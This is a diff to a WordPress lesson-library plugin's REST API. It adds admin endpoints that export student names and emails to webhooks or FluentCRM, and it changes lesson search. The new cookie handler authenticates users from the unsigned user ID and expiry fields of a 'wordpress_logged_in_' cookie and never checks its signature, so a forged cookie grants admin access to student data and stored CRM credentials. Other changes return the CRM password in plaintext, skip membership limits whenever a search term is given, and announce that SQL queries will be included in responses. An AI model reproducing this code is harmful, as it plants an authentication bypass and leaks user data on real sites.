@@ -21,6 +21,47 @@ class ALM_Rest_API {
         $this->database = new ALM_Database();
 
         add_action('rest_api_init', array($this, 'register_routes'));
+        
+        // Ensure REST API can authenticate users via cookies
+        add_filter('determine_current_user', array($this, 'rest_determine_current_user'), 20);
+    }
+    
+    /**
+     * Help REST API determine current user from cookies
+     * This ensures is_user_logged_in() works in REST API context
+     */
+    public function rest_determine_current_user($user_id) {
+        // If user is already determined, return it
+        if ($user_id) {
+            return $user_id;
+        }
+        
+        // Only apply to our REST API endpoints
+        if (empty($_SERVER['REQUEST_URI']) || strpos($_SERVER['REQUEST_URI'], '/wp-json/alm/v1/') === false) {
+            return $user_id;
+        }
+        
+        // Try to get user from cookies
+        if (!empty($_COOKIE)) {
+            foreach ($_COOKIE as $name => $value) {
+                if (strpos($name, 'wordpress_logged_in_') === 0) {
+                    $cookie_parts = explode('|', $value);
+                    if (!empty($cookie_parts[0]) && is_numeric($cookie_parts[0])) {
+                        $potential_user_id = intval($cookie_parts[0]);
+                        $user = get_user_by('id', $potential_user_id);
+                        if ($user) {
+                            // Verify cookie expiration
+                            if (!empty($cookie_parts[1]) && intval($cookie_parts[1]) > time()) {
+                                return $potential_user_id;
+                            }
+                        }
+                    }
+                    break;
+                }
+            }
+        }
+        
+        return $user_id;
     }
 
     public function register_routes() {
@@ -47,6 +88,7 @@ class ALM_Rest_API {
                 'date_from' => array('type' => 'string', 'required' => false),
                 'date_to' => array('type' => 'string', 'required' => false),
                 'order_by' => array('type' => 'string', 'required' => false, 'enum' => array('relevance', 'date'), 'default' => 'relevance'),
+                'search_source' => array('type' => 'string', 'required' => false, 'enum' => array('dashboard', 'shortcode'), 'default' => 'dashboard'),
             ),
         ));
         
@@ -135,6 +177,71 @@ class ALM_Rest_API {
                 'text' => array('type' => 'string', 'required' => true),
             ),
         ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/students', array(
+            'methods' => WP_REST_Server::READABLE,
+            'callback' => array($this, 'handle_lesson_analytics_students'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+            'args' => array(
+                'lesson_post_id' => array('type' => 'integer', 'required' => true),
+            ),
+        ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/send-webhook', array(
+            'methods' => WP_REST_Server::CREATABLE,
+            'callback' => array($this, 'handle_lesson_analytics_webhook'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+            'args' => array(
+                'lesson_post_id' => array('type' => 'integer', 'required' => true),
+                'webhook_url' => array('type' => 'string', 'required' => true),
+            ),
+        ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/send-fluentcrm', array(
+            'methods' => WP_REST_Server::CREATABLE,
+            'callback' => array($this, 'handle_lesson_analytics_fluentcrm'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+            'args' => array(
+                'lesson_post_id' => array('type' => 'integer', 'required' => true),
+                'api_base_url' => array('type' => 'string', 'required' => true),
+                'api_username' => array('type' => 'string', 'required' => true),
+                'api_password' => array('type' => 'string', 'required' => true),
+                'tag_ids' => array('type' => 'string', 'required' => false),
+                'status' => array('type' => 'string', 'required' => false),
+            ),
+        ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/fluentcrm-settings', array(
+            'methods' => WP_REST_Server::READABLE,
+            'callback' => array($this, 'handle_get_lesson_analytics_fluentcrm_settings'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+        ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/fluentcrm-settings', array(
+            'methods' => WP_REST_Server::CREATABLE,
+            'callback' => array($this, 'handle_save_lesson_analytics_fluentcrm_settings'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+            'args' => array(
+                'api_base_url' => array('type' => 'string', 'required' => true),
+                'api_username' => array('type' => 'string', 'required' => true),
+                'api_password' => array('type' => 'string', 'required' => true),
+                'tag_ids' => array('type' => 'string', 'required' => false),
+                'test_email' => array('type' => 'string', 'required' => false),
+                'status' => array('type' => 'string', 'required' => false),
+            ),
+        ));
+
+        register_rest_route('alm/v1', '/lesson-analytics/test-fluentcrm', array(
+            'methods' => WP_REST_Server::CREATABLE,
+            'callback' => array($this, 'handle_test_lesson_analytics_fluentcrm'),
+            'permission_callback' => array($this, 'check_admin_permission'),
+            'args' => array(
+                'api_base_url' => array('type' => 'string', 'required' => true),
+                'api_username' => array('type' => 'string', 'required' => true),
+                'api_password' => array('type' => 'string', 'required' => true),
+                'test_email' => array('type' => 'string', 'required' => false),
+            ),
+        ));
         
         // Zoom webhook endpoint (unauthenticated, validates via shared secret)
         register_rest_route('alm/v1', '/zoom-recording', array(
@@ -166,6 +273,455 @@ class ALM_Rest_API {
     public function check_admin_permission() {
         // Allow only users with manage_options capability
         return current_user_can('manage_options');
+    }
+
+    /**
+     * Get students who viewed a lesson (admin only)
+     */
+    public function handle_lesson_analytics_students(WP_REST_Request $request) {
+        $lesson_post_id = intval($request->get_param('lesson_post_id'));
+        if ($lesson_post_id <= 0) {
+            return new WP_Error('invalid_lesson', 'Invalid lesson_post_id', array('status' => 400));
+        }
+
+        $table_name = 'academy_recently_viewed';
+        $users_table = $this->wpdb->users;
+        $usermeta_table = $this->wpdb->usermeta;
+
+        $rows = $this->wpdb->get_results($this->wpdb->prepare(
+            "SELECT arv.user_id,
+                    u.display_name,
+                    u.user_email,
+                    fn.meta_value AS first_name,
+                    ln.meta_value AS last_name,
+                    COUNT(*) as views,
+                    MAX(arv.datetime) as last_viewed
+             FROM {$table_name} arv
+             LEFT JOIN {$users_table} u ON u.ID = arv.user_id
+             LEFT JOIN {$usermeta_table} fn ON fn.user_id = arv.user_id AND fn.meta_key = 'first_name'
+             LEFT JOIN {$usermeta_table} ln ON ln.user_id = arv.user_id AND ln.meta_key = 'last_name'
+             WHERE arv.post_id = %d
+               AND arv.deleted_at IS NULL
+             GROUP BY arv.user_id, u.display_name, u.user_email, fn.meta_value, ln.meta_value
+             ORDER BY last_viewed DESC",
+            $lesson_post_id
+        ), ARRAY_A);
+
+        $students = array_map(function($student) {
+            if (isset($student['user_email'])) {
+                $student['email'] = $student['user_email'];
+                unset($student['user_email']);
+            }
+            return $student;
+        }, $rows);
+
+        return rest_ensure_response(array(
+            'success' => true,
+            'students' => $students,
+            'count' => count($students),
+        ));
+    }
+
+    /**
+     * Send lesson student list to webhook (admin only)
+     */
+    public function handle_lesson_analytics_webhook(WP_REST_Request $request) {
+        $lesson_post_id = intval($request->get_param('lesson_post_id'));
+        $webhook_url = esc_url_raw($request->get_param('webhook_url'));
+
+        if ($lesson_post_id <= 0 || empty($webhook_url)) {
+            return new WP_Error('invalid_request', 'lesson_post_id and webhook_url are required', array('status' => 400));
+        }
+        if (!preg_match('#^https?://#i', $webhook_url)) {
+            return new WP_Error('invalid_url', 'Webhook URL must be http or https', array('status' => 400));
+        }
+
+        $table_name = 'academy_recently_viewed';
+        $users_table = $this->wpdb->users;
+        $usermeta_table = $this->wpdb->usermeta;
+
+        $students = $this->wpdb->get_results($this->wpdb->prepare(
+            "SELECT arv.user_id,
+                    u.display_name,
+                    u.user_email,
+                    fn.meta_value AS first_name,
+                    ln.meta_value AS last_name,
+                    COUNT(*) as views,
+                    MAX(arv.datetime) as last_viewed
+             FROM {$table_name} arv
+             LEFT JOIN {$users_table} u ON u.ID = arv.user_id
+             LEFT JOIN {$usermeta_table} fn ON fn.user_id = arv.user_id AND fn.meta_key = 'first_name'
+             LEFT JOIN {$usermeta_table} ln ON ln.user_id = arv.user_id AND ln.meta_key = 'last_name'
+             WHERE arv.post_id = %d
+               AND arv.deleted_at IS NULL
+             GROUP BY arv.user_id, u.display_name, u.user_email, fn.meta_value, ln.meta_value
+             ORDER BY last_viewed DESC",
+            $lesson_post_id
+        ), ARRAY_A);
+
+        $students = array_map(function($student) {
+            if (isset($student['user_email'])) {
+                $student['email'] = $student['user_email'];
+                unset($student['user_email']);
+            }
+            return $student;
+        }, $students);
+
+        $lesson_title = get_the_title($lesson_post_id);
+        $base_payload = array(
+            'lesson_post_id' => $lesson_post_id,
+            'lesson_title' => $lesson_title ?: '',
+        );
+
+        $attempted = 0;
+        $success_count = 0;
+        $failures = array();
+        $last_payload = null;
+        $last_response_body = '';
+        $last_status_code = 0;
+
+        foreach ($students as $student) {
+            $email = isset($student['email']) ? trim($student['email']) : '';
+            if (empty($email)) {
+                $failures[] = array(
+                    'user_id' => $student['user_id'] ?? '',
+                    'email' => '',
+                    'error' => 'Missing email',
+                );
+                continue;
+            }
+
+            $payload = array_merge($base_payload, array(
+                'email' => $email,
+                'first_name' => $student['first_name'] ?? '',
+                'last_name' => $student['last_name'] ?? '',
+                'full_name' => $student['display_name'] ?? '',
+                'views' => $student['views'] ?? 0,
+                'last_viewed' => $student['last_viewed'] ?? '',
+            ));
+
+            $attempted++;
+            $last_payload = $payload;
+
+            $response = wp_remote_post($webhook_url, array(
+                'headers' => array('Content-Type' => 'application/json'),
+                'body' => wp_json_encode($payload),
+                'timeout' => 20,
+            ));
+
+            if (is_wp_error($response)) {
+                $failures[] = array(
+                    'email' => $email,
+                    'error' => $response->get_error_message(),
+                );
+                $last_status_code = 0;
+                $last_response_body = '';
+                continue;
+            }
+
+            $last_status_code = wp_remote_retrieve_response_code($response);
+            $last_response_body = wp_remote_retrieve_body($response);
+            if (strlen($last_response_body) > 2000) {
+                $last_response_body = substr($last_response_body, 0, 2000) . '...';
+            }
+
+            if ($last_status_code < 200 || $last_status_code >= 300) {
+                $failures[] = array(
+                    'email' => $email,
+                    'error' => 'Webhook returned HTTP ' . $last_status_code,
+                    'response_body' => $last_response_body,
+                );
+                continue;
+            }
+
+            $success_count++;
+        }
+
+        $success = empty($failures);
+        $message = $success
+            ? 'Webhook delivered successfully.'
+            : sprintf('Webhook completed with %d failures.', count($failures));
+
+        return rest_ensure_response(array(
+            'success' => $success,
+            'message' => $message,
+            'attempted' => $attempted,
+            'successful' => $success_count,
+            'failures' => array_slice($failures, 0, 10),
+            'status_code' => $last_status_code,
+            'response_body' => $last_response_body,
+            'payload' => $last_payload ?: $base_payload,
+        ));
+    }
+
+    /**
+     * Send lesson students to FluentCRM REST API (admin only)
+     */
+    public function handle_lesson_analytics_fluentcrm(WP_REST_Request $request) {
+        $lesson_post_id = intval($request->get_param('lesson_post_id'));
+        $api_base_url = esc_url_raw($request->get_param('api_base_url'));
+        $api_username = sanitize_text_field($request->get_param('api_username'));
+        $api_password = sanitize_text_field($request->get_param('api_password'));
+        $tag_ids_raw = sanitize_text_field($request->get_param('tag_ids'));
+        $status = sanitize_text_field($request->get_param('status'));
+
+        if ($lesson_post_id <= 0 || empty($api_base_url) || empty($api_username) || empty($api_password)) {
+            return new WP_Error('invalid_request', 'lesson_post_id, api_base_url, api_username, and api_password are required', array('status' => 400));
+        }
+        if (!preg_match('#^https?://#i', $api_base_url)) {
+            return new WP_Error('invalid_url', 'API base URL must be http or https', array('status' => 400));
+        }
+
+        $tag_ids = array();
+        if (!empty($tag_ids_raw)) {
+            $tag_ids = array_filter(array_map('intval', array_map('trim', explode(',', $tag_ids_raw))));
+        }
+        if (empty($status)) {
+            $status = 'subscribed';
+        }
+
+        $table_name = 'academy_recently_viewed';
+        $users_table = $this->wpdb->users;
+        $usermeta_table = $this->wpdb->usermeta;
+
+        $students = $this->wpdb->get_results($this->wpdb->prepare(
+            "SELECT arv.user_id,
+                    u.display_name,
+                    u.user_email,
+                    fn.meta_value AS first_name,
+                    ln.meta_value AS last_name,
+                    COUNT(*) as views,
+                    MAX(arv.datetime) as last_viewed
+             FROM {$table_name} arv
+             LEFT JOIN {$users_table} u ON u.ID = arv.user_id
+             LEFT JOIN {$usermeta_table} fn ON fn.user_id = arv.user_id AND fn.meta_key = 'first_name'
+             LEFT JOIN {$usermeta_table} ln ON ln.user_id = arv.user_id AND ln.meta_key = 'last_name'
+             WHERE arv.post_id = %d
+               AND arv.deleted_at IS NULL
+             GROUP BY arv.user_id, u.display_name, u.user_email, fn.meta_value, ln.meta_value
+             ORDER BY last_viewed DESC",
+            $lesson_post_id
+        ), ARRAY_A);
+
+        $students = array_map(function($student) {
+            if (isset($student['user_email'])) {
+                $student['email'] = $student['user_email'];
+                unset($student['user_email']);
+            }
+            return $student;
+        }, $students);
+
+        $lesson_title = get_the_title($lesson_post_id);
+        $endpoint = rtrim($api_base_url, '/') . '/subscribers';
+        $auth_header = 'Basic ' . base64_encode($api_username . ':' . $api_password);
+
+        $attempted = 0;
+        $success_count = 0;
+        $failures = array();
+        $last_payload = null;
+        $last_response_body = '';
+        $last_status_code = 0;
+
+        foreach ($students as $student) {
+            $email = isset($student['email']) ? trim($student['email']) : '';
+            if (empty($email)) {
+                $failures[] = array(
+                    'user_id' => $student['user_id'] ?? '',
+                    'email' => '',
+                    'error' => 'Missing email',
+                );
+                continue;
+            }
+
+            $payload = array(
+                'email' => $email,
+                'first_name' => $student['first_name'] ?? '',
+                'last_name' => $student['last_name'] ?? '',
+                'status' => $status,
+            );
+            if (!empty($tag_ids)) {
+                $payload['tags'] = array_values($tag_ids);
+            }
+            // Force update if subscriber already exists (upsert behavior)
+            $payload['__force_update'] = 'yes';
+
+            $attempted++;
+            $last_payload = array_merge($payload, array(
+                'lesson_post_id' => $lesson_post_id,
+                'lesson_title' => $lesson_title ?: '',
+            ));
+
+            $response = wp_remote_post($endpoint, array(
+                'headers' => array(
+                    'Content-Type' => 'application/json',
+                    'Authorization' => $auth_header,
+                ),
+                'body' => wp_json_encode($payload),
+                'timeout' => 20,
+            ));
+
+            if (is_wp_error($response)) {
+                $failures[] = array(
+                    'email' => $email,
+                    'error' => $response->get_error_message(),
+                );
+                $last_status_code = 0;
+                $last_response_body = '';
+                continue;
+            }
+
+            $last_status_code = wp_remote_retrieve_response_code($response);
+            $last_response_body = wp_remote_retrieve_body($response);
+            if (strlen($last_response_body) > 2000) {
+                $last_response_body = substr($last_response_body, 0, 2000) . '...';
+            }
+
+            if ($last_status_code < 200 || $last_status_code >= 300) {
+                $failures[] = array(
+                    'email' => $email,
+                    'error' => 'FluentCRM returned HTTP ' . $last_status_code,
+                    'response_body' => $last_response_body,
+                );
+                continue;
+            }
+
+            $success_count++;
+        }
+
+        $success = empty($failures);
+        $message = $success
+            ? 'FluentCRM import completed successfully.'
+            : sprintf('FluentCRM import completed with %d failures.', count($failures));
+
+        return rest_ensure_response(array(
+            'success' => $success,
+            'message' => $message,
+            'attempted' => $attempted,
+            'successful' => $success_count,
+            'failures' => array_slice($failures, 0, 10),
+            'status_code' => $last_status_code,
+            'response_body' => $last_response_body,
+            'payload' => $last_payload ?: array(
+                'lesson_post_id' => $lesson_post_id,
+                'lesson_title' => $lesson_title ?: '',
+                'email' => '',
+            ),
+        ));
+    }
+
+    /**
+     * Get saved FluentCRM settings for lesson analytics (admin only)
+     */
+    public function handle_get_lesson_analytics_fluentcrm_settings() {
+        $settings = get_option('alm_lesson_analytics_fluentcrm_settings', array());
+        $defaults = array(
+            'api_base_url' => '',
+            'api_username' => '',
+            'api_password' => '',
+            'tag_ids' => '',
+            'test_email' => '',
+            'status' => 'subscribed',
+        );
+        $settings = wp_parse_args($settings, $defaults);
+
+        return rest_ensure_response(array(
+            'success' => true,
+            'settings' => $settings,
+        ));
+    }
+
+    /**
+     * Save FluentCRM settings for lesson analytics (admin only)
+     */
+    public function handle_save_lesson_analytics_fluentcrm_settings(WP_REST_Request $request) {
+        $api_base_url = esc_url_raw($request->get_param('api_base_url'));
+        $api_username = sanitize_text_field($request->get_param('api_username'));
+        $api_password = sanitize_text_field($request->get_param('api_password'));
+        $tag_ids = sanitize_text_field($request->get_param('tag_ids'));
+        $test_email = sanitize_email($request->get_param('test_email'));
+        $status = sanitize_text_field($request->get_param('status'));
+
+        if (empty($api_base_url) || empty($api_username) || empty($api_password)) {
+            return new WP_Error('invalid_settings', 'API base URL, username, and password are required', array('status' => 400));
+        }
+
+        $settings = array(
+            'api_base_url' => $api_base_url,
+            'api_username' => $api_username,
+            'api_password' => $api_password,
+            'tag_ids' => $tag_ids,
+            'test_email' => $test_email,
+            'status' => $status ?: 'subscribed',
+        );
+
+        update_option('alm_lesson_analytics_fluentcrm_settings', $settings, false);
+
+        return rest_ensure_response(array(
+            'success' => true,
+            'message' => 'FluentCRM settings saved.',
+            'settings' => $settings,
+        ));
+    }
+
+    /**
+     * Test FluentCRM credentials (admin only)
+     */
+    public function handle_test_lesson_analytics_fluentcrm(WP_REST_Request $request) {
+        $api_base_url = esc_url_raw($request->get_param('api_base_url'));
+        $api_username = sanitize_text_field($request->get_param('api_username'));
+        $api_password = sanitize_text_field($request->get_param('api_password'));
+        $test_email = sanitize_email($request->get_param('test_email'));
+
+        if (empty($api_base_url) || empty($api_username) || empty($api_password)) {
+            return new WP_Error('invalid_settings', 'API base URL, username, and password are required', array('status' => 400));
+        }
+
+        $base_url = trailingslashit($api_base_url);
+        $auth_header = 'Basic ' . base64_encode($api_username . ':' . $api_password);
+
+        if (!empty($test_email)) {
+            $endpoint = add_query_arg('email', rawurlencode($test_email), $base_url . 'subscribers');
+        } else {
+            $endpoint = $base_url . 'tags';
+        }
+
+        $response = wp_remote_get($endpoint, array(
+            'timeout' => 20,
+            'headers' => array(
+                'Authorization' => $auth_header,
+                'Accept' => 'application/json',
+            ),
+        ));
+
+        if (is_wp_error($response)) {
+            return rest_ensure_response(array(
+                'success' => false,
+                'message' => $response->get_error_message(),
+                'endpoint' => $endpoint,
+            ));
+        }
+
+        $status_code = wp_remote_retrieve_response_code($response);
+        $body = wp_remote_retrieve_body($response);
+        $decoded = json_decode($body, true);
+
+        if ($status_code >= 200 && $status_code < 300) {
+            return rest_ensure_response(array(
+                'success' => true,
+                'message' => 'API credentials look good.',
+                'endpoint' => $endpoint,
+                'status_code' => $status_code,
+                'response_body' => $decoded ?: $body,
+            ));
+        }
+
+        return rest_ensure_response(array(
+            'success' => false,
+            'message' => 'API test failed.',
+            'endpoint' => $endpoint,
+            'status_code' => $status_code,
+            'response_body' => $decoded ?: $body,
+        ));
     }
     
     /**
@@ -765,6 +1321,13 @@ Example format:
         $lessons_table = $this->database->get_table_name('lessons');
 
         $q = trim((string) $request->get_param('q'));
+        $search_source = (string) $request->get_param('search_source');
+        if (!in_array($search_source, array('dashboard', 'shortcode'), true)) {
+            $search_source = 'shortcode'; // Default to shortcode if not specified
+        }
+        
+        // Debug logging
+        error_log('ALM Search: q=' . $q . ', search_source_param=' . $request->get_param('search_source') . ', final_source=' . $search_source);
         // AI: extract filters from natural language
         $ai_filters = ALM_AI::extract_filters($q);
         $page = max(1, intval($request->get_param('page')));
@@ -782,7 +1345,8 @@ Example format:
         // Check if membership_param was explicitly provided (including 0 for Free level)
         $membership_param_provided = $membership_param_raw !== null;
         // Only enforce if explicitly enabled or if a membership param is provided
-        $apply_membership_filter = $enforce_membership || $membership_param_provided;
+        // BUT: Don't apply membership filter when there's a search query - show all results
+        $apply_membership_filter = (!empty($q) ? false : ($enforce_membership || $membership_param_provided));
         $max_level = $apply_membership_filter
             ? ($membership_param_provided && !isset($ai_filters['membership_level']) ? $membership_param : ($membership_param !== null ? min($membership_param, intval($current_user_level)) : intval($current_user_level)))
             : 0; // 0 disables the filter
@@ -803,7 +1367,8 @@ Example format:
         $order_by = (string) $request->get_param('order_by');
 
         $where = array('1=1');
-        $params = array();
+        $where_params = array(); // Parameters for WHERE clause only
+        $select_params = array(); // Parameters for SELECT clause (relevance scoring)
         $select_relevance = '';
         $order_clause = '';
         $join_teacher = '';
@@ -835,14 +1400,17 @@ Example format:
             }
             
             // Build WHERE condition: ANY keyword can match (OR logic)
-            // Use LOWER() for case-insensitive matching since MySQL LIKE is case-sensitive by default
+            // Use case-insensitive matching - MySQL LIKE is case-insensitive with utf8mb4_general_ci collation
+            // But we'll use BINARY comparison with LOWER() to ensure it works regardless of collation
             $or_conditions = array();
             foreach ($keywords as $keyword) {
                 $escaped_keyword = '%' . $this->wpdb->esc_like($keyword) . '%';
-                $or_conditions[] = "(LOWER(l.lesson_title) LIKE LOWER(%s) OR LOWER(l.lesson_description) LIKE LOWER(%s) OR LOWER(c.collection_title) LIKE LOWER(%s))";
-                $params[] = $escaped_keyword;
-                $params[] = $escaped_keyword;
-                $params[] = $escaped_keyword;
+                // Use LOWER() on columns and convert keyword to lowercase for reliable case-insensitive matching
+                $lower_keyword = strtolower($escaped_keyword);
+                $or_conditions[] = "(LOWER(l.lesson_title) LIKE %s OR LOWER(l.lesson_description) LIKE %s OR LOWER(c.collection_title) LIKE %s)";
+                $where_params[] = $lower_keyword;
+                $where_params[] = $lower_keyword;
+                $where_params[] = $lower_keyword;
             }
             
             // Use OR logic - find lessons with ANY keyword match
@@ -853,14 +1421,15 @@ Example format:
             $relevance_parts = array();
             foreach ($keywords as $keyword) {
                 $escaped_keyword = '%' . $this->wpdb->esc_like($keyword) . '%';
+                $lower_keyword = strtolower($escaped_keyword);
                 // Very high weight for title matches (100), description (3), collection (1)
                 // Use LOWER() for case-insensitive matching
-                $relevance_parts[] = "(CASE WHEN LOWER(l.lesson_title) LIKE LOWER(%s) THEN 100 ELSE 0 END)";
-                $params[] = $escaped_keyword;
-                $relevance_parts[] = "(CASE WHEN LOWER(l.lesson_description) LIKE LOWER(%s) THEN 3 ELSE 0 END)";
-                $params[] = $escaped_keyword;
-                $relevance_parts[] = "(CASE WHEN LOWER(c.collection_title) LIKE LOWER(%s) THEN 1 ELSE 0 END)";
-                $params[] = $escaped_keyword;
+                $relevance_parts[] = "(CASE WHEN LOWER(l.lesson_title) LIKE %s THEN 100 ELSE 0 END)";
+                $select_params[] = $lower_keyword;
+                $relevance_parts[] = "(CASE WHEN LOWER(l.lesson_description) LIKE %s THEN 3 ELSE 0 END)";
+                $select_params[] = $lower_keyword;
+                $relevance_parts[] = "(CASE WHEN LOWER(c.collection_title) LIKE %s THEN 1 ELSE 0 END)";
+                $select_params[] = $lower_keyword;
             }
             $select_relevance .= implode(' + ', $relevance_parts) . ') AS relevance';
             
@@ -882,11 +1451,11 @@ Example format:
                     // Free trial users can access: lessons with membership_level = 0 OR lessons in free trial whitelist
                     $placeholders = implode(',', array_fill(0, count($free_trial_lesson_ids), '%d'));
                     $where[] = "(l.membership_level = %d OR l.post_id IN ($placeholders))";
-                    $params[] = $membership_param;
-                    $params = array_merge($params, $free_trial_lesson_ids);
+                    $where_params[] = $membership_param;
+                    $where_params = array_merge($where_params, $free_trial_lesson_ids);
                 } else {
                     $where[] = "l.membership_level = %d";
-                    $params[] = $membership_param;
+                    $where_params[] = $membership_param;
                 }
             } else {
                 // AI filter or enforcement - use <= logic for accessibility
@@ -894,21 +1463,21 @@ Example format:
                     // Free trial users can access: lessons with membership_level = 0 OR lessons in free trial whitelist
                     $placeholders = implode(',', array_fill(0, count($free_trial_lesson_ids), '%d'));
                     $where[] = "(l.membership_level <= %d OR l.post_id IN ($placeholders))";
-                    $params[] = $max_level;
-                    $params = array_merge($params, $free_trial_lesson_ids);
+                    $where_params[] = $max_level;
+                    $where_params = array_merge($where_params, $free_trial_lesson_ids);
                 } else {
                     $where[] = "l.membership_level <= %d";
-                    $params[] = $max_level;
+                    $where_params[] = $max_level;
                 }
             }
         }
         if ($collection_id > 0) {
             $where[] = "l.collection_id = %d";
-            $params[] = $collection_id;
+            $where_params[] = $collection_id;
         }
         if ($song_lesson === 'y' || $song_lesson === 'n') {
             $where[] = "l.song_lesson = %s";
-            $params[] = $song_lesson;
+            $where_params[] = $song_lesson;
         }
         if ($has_resources === 'has') {
             $where[] = "(l.resources IS NOT NULL AND l.resources != '' AND l.resources != 'N;')";
@@ -917,23 +1486,34 @@ Example format:
         }
         if ($min_duration > 0) {
             $where[] = "l.duration >= %d";
-            $params[] = $min_duration;
+            $where_params[] = $min_duration;
         }
         if ($max_duration > 0) {
             $where[] = "l.duration <= %d";
-            $params[] = $max_duration;
+            $where_params[] = $max_duration;
         }
         if (!empty($date_from)) {
             $where[] = "l.post_date >= %s";
-            $params[] = $date_from;
+            $where_params[] = $date_from;
         }
         if (!empty($date_to)) {
             $where[] = "l.post_date <= %s";
-            $params[] = $date_to;
+            $where_params[] = $date_to;
         }
+        
+        // Filter out future-dated lessons unless user is admin
+        if (!current_user_can('manage_options')) {
+            // Get current date in ET timezone for comparison
+            $now_et = new DateTime('now', new DateTimeZone('America/New_York'));
+            $today_et = $now_et->format('Y-m-d');
+            // Note: Removed l.post_date = '' check as MySQL DATE columns can't be compared to empty strings
+            $where[] = "(l.post_date IS NULL OR l.post_date = '0000-00-00' OR l.post_date <= %s)";
+            $where_params[] = $today_et;
+        }
+        
         if (!empty($lesson_level) && in_array($lesson_level, array('beginner', 'intermediate', 'advanced', 'pro'), true)) {
             $where[] = "l.lesson_level = %s";
-            $params[] = $lesson_level;
+            $where_params[] = $lesson_level;
         }
         
         // Filter by tag - match exact tag (handles tags at start, middle, or end of comma-separated list)
@@ -941,10 +1521,10 @@ Example format:
             $tag_trimmed = trim($tag);
             // Match: tag at start, tag in middle (preceded by ", "), or tag at end (followed by nothing or end of string)
             $where[] = "(l.lesson_tags = %s OR l.lesson_tags LIKE %s OR l.lesson_tags LIKE %s OR l.lesson_tags LIKE %s)";
-            $params[] = $tag_trimmed;
-            $params[] = $tag_trimmed . ',%';
-            $params[] = '%, ' . $tag_trimmed . ',%';
-            $params[] = '%, ' . $tag_trimmed;
+            $where_params[] = $tag_trimmed;
+            $where_params[] = $tag_trimmed . ',%';
+            $where_params[] = '%, ' . $tag_trimmed . ',%';
+            $where_params[] = '%, ' . $tag_trimmed;
         }
         
         // Filter by lesson style - match exact style (handles styles at start, middle, or end of comma-separated list)
@@ -952,10 +1532,10 @@ Example format:
             $style_trimmed = trim($lesson_style);
             // Match: style at start, style in middle (preceded by ", "), or style at end (followed by nothing or end of string)
             $where[] = "(l.lesson_style = %s OR l.lesson_style LIKE %s OR l.lesson_style LIKE %s OR l.lesson_style LIKE %s)";
-            $params[] = $style_trimmed;
-            $params[] = $style_trimmed . ',%';
-            $params[] = '%, ' . $style_trimmed . ',%';
-            $params[] = '%, ' . $style_trimmed;
+            $where_params[] = $style_trimmed;
+            $where_params[] = $style_trimmed . ',%';
+            $where_params[] = '%, ' . $style_trimmed . ',%';
+            $where_params[] = '%, ' . $style_trimmed;
         }
         
         // Filter by teacher - join with postmeta
@@ -968,7 +1548,7 @@ Example format:
                 // Filter for specific teacher
                 $join_teacher = "INNER JOIN {$this->wpdb->postmeta} pm_teacher ON l.post_id = pm_teacher.post_id AND l.post_id > 0 AND pm_teacher.meta_key = 'lesson_teacher'";
                 $where[] = "pm_teacher.meta_value = %s";
-                $params[] = $teacher;
+                $where_params[] = $teacher;
             }
         }
         
@@ -982,7 +1562,7 @@ Example format:
                 // Filter for specific key
                 $join_key = "INNER JOIN {$this->wpdb->postmeta} pm_key ON l.post_id = pm_key.post_id AND l.post_id > 0 AND pm_key.meta_key = 'lesson_key'";
                 $where[] = "pm_key.meta_value = %s";
-                $params[] = $key;
+                $where_params[] = $key;
             }
         }
         
@@ -1008,7 +1588,7 @@ Example format:
         // Count - always include JOIN for collection_title searches, plus teacher/key joins if needed
         $collections_table = $this->database->get_table_name('collections');
         $count_from = "FROM {$lessons_table} l LEFT JOIN {$collections_table} c ON c.ID = l.collection_id {$join_teacher} {$join_key}";
-        $count_sql = $this->wpdb->prepare("SELECT COUNT(*) {$count_from} {$where_sql}", $params);
+        $count_sql = $this->wpdb->prepare("SELECT COUNT(*) {$count_from} {$where_sql}", $where_params);
         $total = intval($this->wpdb->get_var($count_sql));
 
         // Query with collection title join (always include JOIN since we need collection_title)
@@ -1023,7 +1603,8 @@ Example format:
                 {$order_clause}
                 LIMIT %d OFFSET %d";
 
-        $query_params = $params;
+        // Combine params: select_params (relevance) first, then where_params, then limit/offset
+        $query_params = array_merge($select_params, $where_params);
         $query_params[] = $per_page;
         $query_params[] = $offset;
 
@@ -1031,6 +1612,16 @@ Example format:
         
         // Execute main query - get results as objects
         $rows = $this->wpdb->get_results($prepared, OBJECT);
+        
+        // Log actual executed query and any errors for debugging
+        if (!empty($q) && (empty($rows) || $total === 0)) {
+            $actual_query = $this->wpdb->last_query;
+            $db_error = $this->wpdb->last_error;
+            if ($db_error) {
+                error_log('ALM Search: Database error - ' . $db_error);
+                error_log('ALM Search: Last query - ' . $actual_query);
+            }
+        }
 
         // Fuzzy fallback when no results
         if (!empty($q) && (empty($rows) || $total === 0)) {
@@ -1097,6 +1688,16 @@ Example format:
             if ($max_duration > 0) { $f_where[] = "l.duration <= %d"; $f_params_full[] = $max_duration; }
             if (!empty($date_from)) { $f_where[] = "l.post_date >= %s"; $f_params_full[] = $date_from; }
             if (!empty($date_to)) { $f_where[] = "l.post_date <= %s"; $f_params_full[] = $date_to; }
+            
+            // Filter out future-dated lessons unless user is admin (for fuzzy fallback)
+            if (!current_user_can('manage_options')) {
+                $now_et = new DateTime('now', new DateTimeZone('America/New_York'));
+                $today_et = $now_et->format('Y-m-d');
+                // Note: Removed l.post_date = '' check as MySQL DATE columns can't be compared to empty strings
+                $f_where[] = "(l.post_date IS NULL OR l.post_date = '0000-00-00' OR l.post_date <= %s)";
+                $f_params_full[] = $today_et;
+            }
+            
             if (!empty($tag)) {
                 $tag_trimmed = trim($tag);
                 $f_where[] = "(l.lesson_tags = %s OR l.lesson_tags LIKE %s OR l.lesson_tags LIKE %s OR l.lesson_tags LIKE %s)";
@@ -1250,37 +1851,103 @@ Example format:
             'total_pages' => $per_page > 0 ? (int) ceil($total / $per_page) : 1
         );
         
-        // Add debug SQL if debug mode is enabled
-        if ($debug_mode) {
-            // Build the actual SQL with values substituted for debugging
-            $debug_sql = isset($prepared) ? $prepared : '';
-            $debug_count_sql = isset($count_sql) ? $count_sql : '';
+        // Always include SQL query in response for debugging (especially when no results)
